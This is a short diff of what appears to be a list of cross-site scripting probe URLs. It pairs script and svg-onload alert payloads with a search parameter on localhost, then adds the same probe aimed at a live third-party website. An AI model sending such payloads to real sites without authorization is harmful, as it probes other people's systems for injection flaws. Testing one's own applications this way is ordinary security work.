@@ -1,3 +1,5 @@
 http://localhost:5000/?search=<script>alert(123)</script>
-
 http://localhost:5000/?search=<svg onload=alert(123)>
+
+https://vidademotorista.com.br/?s=teste
+https://vidademotorista.com.br/?s=<svg onload=alert(123)>
